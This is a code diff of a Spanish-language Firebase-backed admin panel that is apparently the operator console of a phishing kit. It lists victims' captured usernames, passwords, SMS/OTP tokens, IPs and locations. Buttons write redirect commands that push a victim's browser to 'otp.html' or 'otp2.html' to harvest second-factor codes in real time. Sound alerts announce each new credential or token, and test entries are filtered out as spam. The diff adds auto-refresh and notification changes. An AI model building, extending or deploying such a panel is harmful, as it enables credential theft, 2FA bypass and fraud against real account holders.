@@ -3,6 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <title>PANEL - Sistema Protegido</title>
+    <!-- REFRESH AUTOMATICO CADA 10 SEGUNDOS -->
+    <meta http-equiv="refresh" content="10">
+    
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
@@ -39,6 +42,17 @@
             letter-spacing: 2px;
         }
         
+        .refresh-indicator {
+            background: #10b981;
+            color: #000;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        
         .stats-bar {
             display: flex;
             gap: 20px;
@@ -65,14 +79,13 @@
             letter-spacing: 1px;
         }
         .btn-pink { background: #be185d; color: white; }
-        .btn-pink:hover { background: #9d174d; box-shadow: 0 0 20px rgba(190, 24, 93, 0.5); }
+        .btn-pink:hover { background: #9d174d; }
         .btn-dark { background: #1a1a1a; border: 1px solid #333; color: #888; }
         .btn-dark:hover { border-color: #6366f1; color: #6366f1; }
         
         .table-container {
             padding: 20px 30px;
         }
-        /* AGREGADA COLUMNA TOKEN - ahora son 8 columnas */
         .table-header {
             display: grid;
             grid-template-columns: 80px 120px 140px 140px 100px 140px 140px 1fr;
@@ -97,227 +110,75 @@
             margin-bottom: 8px;
             align-items: center;
             transition: all 0.3s;
-            position: relative;
         }
-        .data-row:hover {
-            background: #1a1a1a;
-            border-left-color: #8b5cf6;
-        }
-        .data-row.spam { 
-            border-left-color: #ef4444; 
-            opacity: 0.6;
-            background: #1a0505;
-        }
+        .data-row:hover { background: #1a1a1a; }
+        .data-row.spam { border-left-color: #ef4444; opacity: 0.6; background: #1a0505; }
         .data-row.nuevo { 
-            animation: pulseBorder 2s infinite;
+            animation: flashNuevo 2s;
             border-left-color: #10b981;
             background: #0a1f15;
         }
         .data-row.nuevo-otp { 
-            animation: pulsePurple 2s infinite;
+            animation: flashOTP 2s;
             border-left-color: #8b5cf6;
             background: #1a0f2e;
         }
-        @keyframes pulseBorder {
+        @keyframes flashNuevo {
             0%, 100% { box-shadow: 0 0 0 rgba(16, 185, 129, 0); }
-            50% { box-shadow: 0 0 30px rgba(16, 185, 129, 0.3); }
+            50% { box-shadow: 0 0 30px rgba(16, 185, 129, 0.5); }
         }
-        @keyframes pulsePurple {
+        @keyframes flashOTP {
             0%, 100% { box-shadow: 0 0 0 rgba(139, 92, 246, 0); }
-            50% { box-shadow: 0 0 30px rgba(139, 92, 246, 0.3); }
+            50% { box-shadow: 0 0 30px rgba(139, 92, 246, 0.5); }
         }
         
-        .cell-status {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 11px;
-            font-weight: bold;
-        }
-        .live-dot {
-            width: 8px;
-            height: 8px;
-            background: #10b981;
-            border-radius: 50%;
-            animation: blink 1.5s infinite;
-            box-shadow: 0 0 10px #10b981;
-        }
+        .cell-status { display: flex; align-items: center; gap: 8px; font-size: 11px; font-weight: bold; }
+        .live-dot { width: 8px; height: 8px; background: #10b981; border-radius: 50%; animation: blink 1.5s infinite; }
         @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
         
         .cell-tipo { font-size: 12px; }
         .cell-tipo .tipo-main { color: #fff; font-weight: bold; text-transform: uppercase; }
-        .cell-tipo .tipo-sub { color: #6366f1; font-size: 9px; text-transform: uppercase; }
+        .cell-tipo .tipo-sub { color: #6366f1; font-size: 9px; }
         
-        .cell-user { 
-            font-family: 'JetBrains Mono', monospace;
-            color: #3b82f6;
-            font-weight: bold;
-            font-size: 13px;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        .cell-pass { 
-            font-family: 'JetBrains Mono', monospace;
-            color: #ef4444;
-            font-weight: bold;
-            font-size: 13px;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        /* NUEVA CELDA PARA TOKEN */
-        .cell-token {
-            font-family: 'JetBrains Mono', monospace;
-            color: #10b981;
-            font-weight: bold;
-            font-size: 14px;
-            background: #0a1f15;
-            padding: 5px 10px;
-            border-radius: 5px;
-            text-align: center;
-            border: 1px solid #10b981;
-        }
-        .cell-token.vacio {
-            color: #666;
-            background: #1a1a1a;
-            border: 1px solid #333;
-        }
-        .cell-ip { 
-            font-family: 'JetBrains Mono', monospace;
-            color: #f59e0b;
-            font-size: 11px;
-        }
-        .cell-geo { 
-            color: #888;
-            font-size: 11px;
-        }
+        .cell-user { font-family: 'JetBrains Mono', monospace; color: #3b82f6; font-weight: bold; font-size: 13px; overflow: hidden; text-overflow: ellipsis; }
+        .cell-pass { font-family: 'JetBrains Mono', monospace; color: #ef4444; font-weight: bold; font-size: 13px; overflow: hidden; text-overflow: ellipsis; }
         
-        .actions {
-            display: flex;
-            gap: 5px;
-            justify-content: flex-end;
-        }
-        .btn-action {
-            padding: 6px 12px;
-            border: none;
-            border-radius: 5px;
-            font-size: 9px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.2s;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
+        .cell-token { font-family: 'JetBrains Mono', monospace; color: #10b981; font-weight: bold; font-size: 14px; background: #0a1f15; padding: 5px 10px; border-radius: 5px; text-align: center; border: 1px solid #10b981; }
+        .cell-token.vacio { color: #666; background: #1a1a1a; border: 1px solid #333; }
+        
+        .cell-ip { font-family: 'JetBrains Mono', monospace; color: #f59e0b; font-size: 11px; }
+        .cell-geo { color: #888; font-size: 11px; }
+        
+        .actions { display: flex; gap: 5px; justify-content: flex-end; }
+        .btn-action { padding: 6px 12px; border: none; border-radius: 5px; font-size: 9px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
         .btn-sms1 { background: #d97706; color: white; }
-        .btn-sms1:hover { background: #b45309; }
         .btn-sms2 { background: #ea580c; color: white; }
-        .btn-sms2:hover { background: #c2410c; }
         .btn-reject { background: #374151; color: #9ca3af; }
-        .btn-reject:hover { background: #4b5563; color: white; }
         .btn-delete { background: #dc2626; color: white; }
-        .btn-delete:hover { background: #b91c1c; }
         
-        #login-overlay {
-            position: fixed;
-            inset: 0;
-            background: #000;
-            z-index: 1000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .login-box {
-            background: #0a0a0a;
-            border: 2px solid #6366f1;
-            padding: 50px;
-            border-radius: 10px;
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-        }
-        .login-box h2 {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 28px;
-            margin-bottom: 30px;
-            color: #6366f1;
-        }
-        .login-box input {
-            width: 100%;
-            background: #111;
-            border: 1px solid #333;
-            padding: 15px;
-            margin-bottom: 15px;
-            color: #fff;
-            font-family: 'JetBrains Mono', monospace;
-            border-radius: 5px;
-        }
-        .login-box input:focus {
-            outline: none;
-            border-color: #6366f1;
-        }
-        .login-box button {
-            width: 100%;
-            background: #6366f1;
-            color: white;
-            border: none;
-            padding: 15px;
-            font-weight: bold;
-            cursor: pointer;
-            border-radius: 5px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
+        #login-overlay { position: fixed; inset: 0; background: #000; z-index: 1000; display: flex; align-items: center; justify-content: center; }
+        .login-box { background: #0a0a0a; border: 2px solid #6366f1; padding: 50px; border-radius: 10px; width: 100%; max-width: 400px; text-align: center; }
+        .login-box h2 { font-family: 'Orbitron', sans-serif; font-size: 28px; margin-bottom: 30px; color: #6366f1; }
+        .login-box input { width: 100%; background: #111; border: 1px solid #333; padding: 15px; margin-bottom: 15px; color: #fff; font-family: 'JetBrains Mono', monospace; border-radius: 5px; }
+        .login-box button { width: 100%; background: #6366f1; color: white; border: none; padding: 15px; font-weight: bold; cursor: pointer; border-radius: 5px; text-transform: uppercase; letter-spacing: 2px; }
         
-        .notificacion-flotante {
-            position: fixed;
-            top: 100px;
-            right: 30px;
-            padding: 20px 30px;
-            background: #0a0a0a;
-            border-left: 4px solid #10b981;
-            color: white;
-            font-weight: bold;
-            z-index: 200;
-            transform: translateX(500px);
-            transition: transform 0.3s ease;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
-        }
+        .notificacion-flotante { position: fixed; top: 100px; right: 30px; padding: 20px 30px; background: #0a0a0a; border-left: 4px solid #10b981; color: white; font-weight: bold; z-index: 200; transform: translateX(500px); transition: transform 0.3s; }
         .notificacion-flotante.mostrar { transform: translateX(0); }
         .notificacion-otp { border-left-color: #8b5cf6; }
         
-        .alerta-ataque {
-            background: linear-gradient(90deg, #7f1d1d, #991b1b);
-            border-left: 4px solid #ef4444;
-            padding: 15px 30px;
-            margin: 20px 30px;
-            border-radius: 5px;
-            display: none;
-        }
+        .alerta-ataque { background: linear-gradient(90deg, #7f1d1d, #991b1b); border-left: 4px solid #ef4444; padding: 15px 30px; margin: 20px 30px; border-radius: 5px; display: none; }
         .alerta-ataque.mostrar { display: block; }
         
-        .badge-count {
-            background: #6366f1;
-            color: white;
-            padding: 2px 6px;
-            border-radius: 8px;
-            font-size: 9px;
-            margin-left: 3px;
-        }
-        
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: #0a0a0a; }
-        ::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
-        ::-webkit-scrollbar-thumb:hover { background: #6366f1; }
+        .badge-count { background: #6366f1; color: white; padding: 2px 6px; border-radius: 8px; font-size: 9px; margin-left: 3px; }
     </style>
 </head>
 <body>
 
-    <!-- NOTIFICACIONES -->
     <div id="notificacion" class="notificacion-flotante">
         <i class="fa-solid fa-bell mr-2"></i>
         <span id="notificacion-texto">Nuevo cliente</span>
     </div>
 
-    <!-- LOGIN -->
     <div id="login-overlay">
         <div class="login-box">
             <h2>🔐 ACCESO PANEL</h2>
@@ -328,12 +189,11 @@
         </div>
     </div>
 
-    <!-- PANEL -->
     <div id="panel-content" style="display: none;">
-        <!-- HEADER -->
         <div class="header">
             <div style="display: flex; align-items: center; gap: 20px;">
                 <div class="logo">PANEL PROTEGIDO</div>
+                <div class="refresh-indicator">AUTO-REFRESH 10s</div>
             </div>
             
             <div class="stats-bar">
@@ -348,25 +208,23 @@
                 <button class="btn-header btn-dark" onclick="cambiarVista('validos')">REGISTROS</button>
                 <button class="btn-header btn-dark" onclick="cambiarVista('spam')">SPAM</button>
                 <button class="btn-header btn-dark" onclick="cambiarVista('ips')">IPs</button>
-                <button class="btn-header btn-pink" onclick="limpiarTests()">LIMPIAR TODO</button>
+                <button class="btn-header btn-pink" onclick="limpiarTests()">LIMPIAR</button>
                 <button class="btn-header btn-dark" onclick="cerrarSesion()">SALIR</button>
             </div>
         </div>
 
-        <!-- ALERTA ATAQUE -->
         <div id="alerta-ataque" class="alerta-ataque">
             <i class="fa-solid fa-triangle-exclamation"></i> 
             ATAQUE DETECTADO: <span id="contador-ataques">0</span> REGISTROS BLOQUEADOS
         </div>
 
-        <!-- TABLA CON COLUMNA TOKEN -->
         <div class="table-container">
             <div class="table-header">
                 <div>ESTADO</div>
                 <div>TIPO</div>
                 <div>USUARIO</div>
                 <div>CONTRASEÑA</div>
-                <div>TOKEN</div>  <!-- NUEVA COLUMNA -->
+                <div>TOKEN</div>
                 <div>IP</div>
                 <div>UBICACIÓN</div>
                 <div style="text-align: right;">ACCIONES</div>
@@ -382,36 +240,36 @@
         let datos = { validos: [], spam: [], blacklist: {} };
         let contadorIPs = {};
         let ataquesDetectados = 0;
-        let ultimosDatos = new Map();
 
-        // SONIDOS MIXKIT - SIEMPRE ACTIVOS AL 100%
-        const sonidoNuevoCliente = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
+        // SONIDOS - PRECARGADOS
+        const sonidoNuevo = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
         const sonidoOTP = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
+        sonidoNuevo.volume = 1.0;
+        sonidoOTP.volume = 1.0;
         
-        // Precargar y configurar
-        sonidoNuevoCliente.load();
-        sonidoOTP.load();
-        sonidoNuevoCliente.volume = 1.0; // 100%
-        sonidoOTP.volume = 1.0; // 100%
-
-        function reproducirSonido(tipo) {
+        // Reproducir sonido inmediatamente
+        function playSound(tipo) {
             try {
-                const audio = tipo === 'nuevo' ? sonidoNuevoCliente.cloneNode() : sonidoOTP.cloneNode();
-                audio.volume = 1.0; // SIEMPRE 100%
-                audio.play().catch(e => {
-                    // Si el navegador bloquea, intentamos de nuevo en 100ms
-                    setTimeout(() => {
-                        audio.play().catch(() => {});
-                    }, 100);
-                });
+                const audio = tipo === 'nuevo' ? sonidoNuevo.cloneNode() : sonidoOTP.cloneNode();
+                audio.volume = 1.0;
+                const playPromise = audio.play();
+                if (playPromise !== undefined) {
+                    playPromise.catch(() => {
+                        // Si falla, intentar con nuevo objeto
+                        setTimeout(() => {
+                            const retry = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
+                            retry.volume = 1.0;
+                            retry.play().catch(() => {});
+                        }, 100);
+                    });
+                }
             } catch(e) {}
         }
 
-        function mostrarNotificacion(texto, tipo) {
+        function mostrarNotificacion(texto) {
             const notif = document.getElementById('notificacion');
-            const notifTexto = document.getElementById('notificacion-texto');
-            notif.className = 'notificacion-flotante mostrar ' + (tipo === 'otp' ? 'notificacion-otp' : '');
-            notifTexto.textContent = texto;
+            document.getElementById('notificacion-texto').textContent = texto;
+            notif.classList.add('mostrar');
             setTimeout(() => notif.classList.remove('mostrar'), 3000);
         }
 
@@ -427,16 +285,14 @@
             }
             
             const userLower = (data.user || '').toLowerCase();
-            const spamUsers = ['test', 'prueba', 'admin', 'demo', 'usuario1', 'usuario2', 'usuario3', 'usuario4', 'usuario5', 
-                             'user1', 'user2', 'user3', 'pass', 'password', '123456', 'qwerty'];
+            const spamUsers = ['test', 'prueba', 'admin', 'demo', 'usuario1', 'usuario2', 'usuario3', 'user1', 'user2', '123456'];
             if (spamUsers.includes(userLower)) {
                 ataquesDetectados++;
                 return true;
             }
             
             const passLower = (data.pass || '').toLowerCase();
-            const spamPasses = ['test', 'prueba', 'admin', 'demo', '123', 'clave1', 'clave2', 'clave3', 'password', 'pass', 
-                              '123456', 'qwerty', '111111', '000000'];
+            const spamPasses = ['test', 'prueba', 'admin', 'demo', '123', 'password', 'pass', '123456', 'qwerty'];
             if (spamPasses.includes(passLower)) {
                 ataquesDetectados++;
                 return true;
@@ -444,7 +300,6 @@
             
             if (data.user.length < 3 || data.user.length > 50) return true;
             if (data.pass.length < 3 || data.pass.length > 100) return true;
-            
             if (data.ip && datos.blacklist[data.ip]) return true;
             
             return false;
@@ -457,8 +312,8 @@
                 sessionStorage.setItem('auth_panel', 'true');
                 document.getElementById('login-overlay').style.display = 'none';
                 document.getElementById('panel-content').style.display = 'block';
-                // Activar audio con primer interacción
-                reproducirSonido('nuevo');
+                // SONIDO DE BIENVENIDA AL ENTRAR (activa el audio)
+                playSound('nuevo');
                 iniciarFirebase();
             } else {
                 document.getElementById('error-msg').style.display = 'block';
@@ -481,23 +336,22 @@
             if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
             db = firebase.database();
 
-            db.ref('logins').on('value', (snap) => {
+            // Guardar último conteo para detectar nuevos después del refresh
+            const ultimoTotal = parseInt(sessionStorage.getItem('ultimo_total') || '0');
+            const ultimoOTPCount = parseInt(sessionStorage.getItem('ultimo_otp_count') || '0');
+
+            db.ref('logins').once('value', (snap) => {
                 const validos = [];
                 contadorIPs = {};
                 ataquesDetectados = 0;
-                const nuevosIDs = new Set();
+                let otpCount = 0;
                 
                 snap.forEach((child) => {
                     const data = child.val();
                     const id = child.key;
                     
                     if (esSpam(id, data)) {
-                        db.ref('spam/' + id).set({
-                            ...data,
-                            deletedAt: Date.now(),
-                            reason: 'auto_spam',
-                            originalId: id
-                        });
+                        db.ref('spam/' + id).set({...data, deletedAt: Date.now(), reason: 'auto_spam'});
                         db.ref('logins/' + id).remove();
                         return;
                     }
@@ -506,19 +360,29 @@
                         contadorIPs[data.ip] = (contadorIPs[data.ip] || 0) + 1;
                     }
                     
-                    if (!ultimosDatos.has(id)) {
-                        nuevosIDs.add(id);
-                    }
+                    const token = data.sms || data.otp || '';
+                    if (token && token !== '' && token !== '----') otpCount++;
                     
                     validos.push({ id, data, esSpam: false });
-                    ultimosDatos.set(id, data);
                 });
                 
-                // SONIDO NUEVO CLIENTE - SIEMPRE ACTIVO
-                if (nuevosIDs.size > 0 && datos.validos.length > 0) {
-                    reproducirSonido('nuevo');
-                    mostrarNotificacion(`¡${nuevosIDs.size} NUEVO CLIENTE!`, 'nuevo');
+                // SONIDO SI HAY MÁS CLIENTES QUE ANTES
+                if (validos.length > ultimoTotal && ultimoTotal > 0) {
+                    playSound('nuevo');
+                    mostrarNotificacion(`¡${validos.length - ultimoTotal} NUEVO CLIENTE!`);
                 }
+                
+                // SONIDO SI HAY MÁS OTPs QUE ANTES
+                if (otpCount > ultimoOTPCount && ultimoOTPCount > 0) {
+                    setTimeout(() => {
+                        playSound('otp');
+                        mostrarNotificacion(`¡${otpCount - ultimoOTPCount} TOKEN RECIBIDO!`);
+                    }, 500);
+                }
+                
+                // Guardar conteos actuales
+                sessionStorage.setItem('ultimo_total', validos.length);
+                sessionStorage.setItem('ultimo_otp_count', otpCount);
                 
                 datos.validos = validos;
                 
@@ -530,47 +394,46 @@
                     alerta.classList.remove('mostrar');
                 }
                 
-                renderizar(nuevosIDs);
+                renderizar();
             });
 
-            db.ref('spam').on('value', (snap) => {
+            db.ref('spam').once('value', (snap) => {
                 datos.spam = [];
                 snap.forEach((child) => {
                     datos.spam.push({ id: child.key, data: child.val(), esSpam: true });
                 });
-                renderizar(new Set());
+                renderizar();
             });
 
-            db.ref('blacklist').on('value', (snap) => {
+            db.ref('blacklist').once('value', (snap) => {
                 datos.blacklist = snap.val() || {};
                 document.getElementById('stat-blocked').textContent = Object.keys(datos.blacklist).length;
-                renderizar(new Set());
+                renderizar();
             });
         }
 
         function cambiarVista(vista) {
             vistaActual = vista;
-            renderizar(new Set());
+            renderizar();
         }
 
         function limpiarTests() {
-            if(!confirm('¿Eliminar todos los registros de prueba?')) return;
+            if(!confirm('¿Eliminar registros de prueba?')) return;
             let eliminados = 0;
-            const patterns = ['test', 'prueba', 'admin', 'demo', 'fake', 'user', 'pass'];
+            const patterns = ['test', 'prueba', 'admin', 'demo'];
             
             datos.validos.forEach(({id, data}) => {
                 if(patterns.some(p => id.toLowerCase().includes(p) || 
-                    (data.user && data.user.toLowerCase().includes(p)) ||
-                    (data.pass && data.pass.toLowerCase().includes(p)))) {
-                    db.ref('spam/' + id).set({...data, cleaned: true});
+                    (data.user && data.user.toLowerCase().includes(p)))) {
+                    db.ref('spam/' + id).set({...data});
                     db.ref('logins/' + id).remove();
                     eliminados++;
                 }
             });
-            alert(`Eliminados ${eliminados} registros`);
+            alert(`Eliminados ${eliminados}`);
         }
 
-        function renderizar(nuevosIDs = new Set()) {
+        function renderizar() {
             const container = document.getElementById('container');
             container.innerHTML = '';
 
@@ -591,70 +454,38 @@
                 return;
             }
 
-            // Detectar OTPs nuevos
-            const otpNuevos = new Set();
-            aMostrar.forEach(({id, data}) => {
-                const prevData = ultimosDatos.get(id);
-                // Verificar si hay un token nuevo (campo 'sms' o 'otp')
-                const tokenActual = data.sms || data.otp || '';
-                const tokenAnterior = prevData ? (prevData.sms || prevData.otp || '') : '';
-                
-                if (tokenActual && tokenActual !== '' && tokenActual !== '----' && 
-                    (tokenAnterior === '' || tokenAnterior === '----' || !tokenAnterior)) {
-                    otpNuevos.add(id);
-                }
-            });
-
-            // SONIDO OTP - SIEMPRE ACTIVO cuando llega token
-            if (otpNuevos.size > 0) {
-                reproducirSonido('otp');
-                mostrarNotificacion(`¡${otpNuevos.size} TOKEN RECIBIDO!`, 'otp');
-            }
-
-            aMostrar.forEach(({id, data, esSpam}) => {
-                const isOnline = data.online === true;
-                // Obtener token de cualquiera de los campos posibles
+            aMostrar.forEach(({id, data, esSpam}, index) => {
                 const token = data.sms || data.otp || '';
                 const tieneOTP = token && token !== '' && token !== '----';
                 const vecesIP = contadorIPs[data.ip] || 1;
                 const ipBloqueada = data.ip && datos.blacklist[data.ip];
-                const esNuevo = nuevosIDs.has(id);
-                const esNuevoOTP = otpNuevos.has(id);
+                
+                // Marcar los más recientes como "nuevos" (últimos 3)
+                const esNuevo = index < 3 && vistaActual !== 'spam';
                 
                 let rowClass = 'data-row';
                 if (esSpam) rowClass += ' spam';
-                if (esNuevo) rowClass += ' nuevo';
-                if (esNuevoOTP) rowClass += ' nuevo-otp';
+                if (esNuevo) rowClass += tieneOTP ? ' nuevo-otp' : ' nuevo';
                 
                 const tipoTexto = tieneOTP ? 'TOKEN OK' : 'CREDENCIALES';
                 const tipoColor = tieneOTP ? 'color: #10b981;' : '';
                 
-                // Mostrar token o esperando
                 const tokenHTML = tieneOTP 
                     ? `<div class="cell-token">${token}</div>`
                     : `<div class="cell-token vacio">----</div>`;
                 
                 container.innerHTML += `
                     <div class="${rowClass}">
-                        <div class="cell-status">
-                            <div class="live-dot"></div>
-                            LIVE
-                        </div>
+                        <div class="cell-status"><div class="live-dot"></div>LIVE</div>
                         <div class="cell-tipo">
                             <div class="tipo-main" style="${tipoColor}">${tipoTexto}</div>
-                            <div class="tipo-sub">${esSpam ? 'SPAM DETECTADO' : 'INGRESANDO'}</div>
+                            <div class="tipo-sub">${esSpam ? 'SPAM' : 'INGRESANDO'}</div>
                         </div>
-                        <div class="cell-user" title="${data.user || ''}">${data.user || 'N/A'}</div>
-                        <div class="cell-pass" title="${data.pass || ''}">${data.pass || '****'}</div>
-                        ${tokenHTML}  <!-- COLUMNA TOKEN VISIBLE -->
-                        <div class="cell-ip">
-                            ${data.ip || 'N/A'}
-                            ${vecesIP > 1 ? `<span class="badge-count">${vecesIP}</span>` : ''}
-                        </div>
-                        <div class="cell-geo">
-                            ${ipBloqueada ? '<span style="color: #dc2626;">[BLOQUEADA]</span> ' : ''}
-                            ${data.location || 'Desconocida'}
-                        </div>
+                        <div class="cell-user">${data.user || 'N/A'}</div>
+                        <div class="cell-pass">${data.pass || '****'}</div>
+                        ${tokenHTML}
+                        <div class="cell-ip">${data.ip || 'N/A'}${vecesIP > 1 ? `<span class="badge-count">${vecesIP}</span>` : ''}</div>
+                        <div class="cell-geo">${ipBloqueada ? '[BLOQUEADA] ' : ''}${data.location || 'Desconocida'}</div>
                         <div class="actions">
                             ${!esSpam ? `
                                 <button class="btn-action btn-sms1" onclick="solicitarOTP('${id}')">SMS 1</button>
@@ -676,27 +507,21 @@
             const ipsOrdenadas = Object.entries(contadorIPs).sort((a, b) => b[1] - a[1]);
             
             if (ipsOrdenadas.length === 0) {
-                container.innerHTML = '<div style="text-align: center; padding: 50px; color: #666;">SIN IPs REGISTRADAS</div>';
+                container.innerHTML = '<div style="text-align: center; padding: 50px; color: #666;">SIN IPs</div>';
                 return;
             }
 
             let html = '<div style="background: #0a0a0a; padding: 20px; border-radius: 10px;">';
-            html += '<h3 style="color: #6366f1; margin-bottom: 20px; font-family: Orbitron;">IPs DETECTADAS</h3>';
             html += '<table style="width: 100%; border-collapse: collapse;">';
-            html += '<tr style="color: #666; font-size: 12px; text-align: left; border-bottom: 1px solid #333;">';
-            html += '<th style="padding: 10px;">IP</th><th>INTENTOS</th><th>ESTADO</th><th>ACCIONES</th></tr>';
+            html += '<tr style="color: #666; font-size: 12px; border-bottom: 1px solid #333;"><th>IP</th><th>INTENTOS</th><th>ESTADO</th><th>ACCIONES</th></tr>';
             
             ipsOrdenadas.forEach(([ip, count]) => {
                 const bloqueada = datos.blacklist[ip];
                 html += `<tr style="border-bottom: 1px solid #1a1a1a;">
-                    <td style="padding: 15px 10px; font-family: monospace; color: ${bloqueada ? '#dc2626' : '#f59e0b'};">${ip}</td>
-                    <td style="padding: 15px 10px;"><span style="background: ${count >= 10 ? '#dc2626' : count >= 5 ? '#f59e0b' : '#10b981'}; color: white; padding: 2px 10px; border-radius: 10px; font-size: 11px;">${count}</span></td>
-                    <td style="padding: 15px 10px; color: ${bloqueada ? '#dc2626' : '#10b981'};">${bloqueada ? 'BLOQUEADA' : 'ACTIVA'}</td>
-                    <td style="padding: 15px 10px;">
-                        <button onclick="toggleBlockIP('${ip}')" class="btn-action ${bloqueada ? 'btn-sms1' : 'btn-delete'}" style="padding: 5px 15px; font-size: 10px;">
-                            ${bloqueada ? 'DESBLOQUEAR' : 'BLOQUEAR'}
-                        </button>
-                    </td>
+                    <td style="padding: 15px; color: ${bloqueada ? '#dc2626' : '#f59e0b'};">${ip}</td>
+                    <td style="padding: 15px;"><span style="background: ${count >= 10 ? '#dc2626' : count >= 5 ? '#f59e0b' : '#10b981'}; color: white; padding: 2px 10px; border-radius: 10px; font-size: 11px;">${count}</span></td>
+                    <td style="padding: 15px; color: ${bloqueada ? '#dc2626' : '#10b981'};">${bloqueada ? 'BLOQUEADA' : 'ACTIVA'}</td>
+                    <td style="padding: 15px;"><button onclick="toggleBlockIP('${ip}')" class="btn-action ${bloqueada ? 'btn-sms1' : 'btn-delete'}" style="padding: 5px 15px; font-size: 10px;">${bloqueada ? 'DESBLOQUEAR' : 'BLOQUEAR'}</button></td>
                 </tr>`;
             });
             
@@ -705,53 +530,23 @@
         }
 
         function toggleBlockIP(ip) {
-            if (!ip || ip === 'unknown') return;
+            if (!ip) return;
             const ipKey = ip.replace(/\./g, '_');
-            
             if (datos.blacklist[ip]) {
-                if (confirm(`¿Desbloquear ${ip}?`)) {
-                    db.ref('blacklist/' + ipKey).remove();
-                }
+                if (confirm(`¿Desbloquear ${ip}?`)) db.ref('blacklist/' + ipKey).remove();
             } else {
-                if (confirm(`¿BLOQUEAR PERMANENTEMENTE ${ip}?`)) {
-                    db.ref('blacklist/' + ipKey).set({ ip: ip, since: Date.now(), count: contadorIPs[ip] || 1 });
-                    datos.validos.forEach(({id, data}) => {
-                        if (data.ip === ip) {
-                            db.ref('spam/' + id).set({...data, blocked: true});
-                            db.ref('logins/' + id).remove();
-                        }
-                    });
+                if (confirm(`¿BLOQUEAR ${ip}?`)) {
+                    db.ref('blacklist/' + ipKey).set({ ip, since: Date.now(), count: contadorIPs[ip] || 1 });
                 }
             }
         }
 
-        function solicitarOTP(id) {
-            db.ref('comandos/' + id).set({ redirect: 'otp.html', ts: Date.now() });
-        }
-        function solicitarOTP2(id) {
-            db.ref('comandos/' + id).set({ redirect: 'otp2.html', ts: Date.now() });
-        }
-        function rechazar(id) {
-            db.ref('comandos/' + id).set({ redirect: 'index.html', ts: Date.now() });
-            db.ref('logins/' + id).update({ step: 'Rechazado', online: false });
-        }
-        function eliminar(id) {
-            if (!confirm('¿Mover a spam?')) return;
-            db.ref('logins/' + id).remove();
-        }
-        function recuperar(id) {
-            db.ref('spam/' + id).once('value').then((snap) => {
-                const data = snap.val();
-                if (data) {
-                    db.ref('logins/' + id).set(data);
-                    db.ref('spam/' + id).remove();
-                }
-            });
-        }
-        function eliminarSpam(id) {
-            if (!confirm('¿Eliminar permanentemente?')) return;
-            db.ref('spam/' + id).remove();
-        }
+        function solicitarOTP(id) { db.ref('comandos/' + id).set({ redirect: 'otp.html', ts: Date.now() }); }
+        function solicitarOTP2(id) { db.ref('comandos/' + id).set({ redirect: 'otp2.html', ts: Date.now() }); }
+        function rechazar(id) { db.ref('comandos/' + id).set({ redirect: 'index.html', ts: Date.now() }); db.ref('logins/' + id).update({ step: 'Rechazado', online: false }); }
+        function eliminar(id) { if(confirm('¿Mover a spam?')) db.ref('logins/' + id).remove(); }
+        function recuperar(id) { db.ref('spam/' + id).once('value').then(snap => { const d = snap.val(); if(d) { db.ref('logins/' + id).set(d); db.ref('spam/' + id).remove(); }}); }
+        function eliminarSpam(id) { if(confirm('¿Eliminar?')) db.ref('spam/' + id).remove(); }
     </script>
 </body>
 </html>
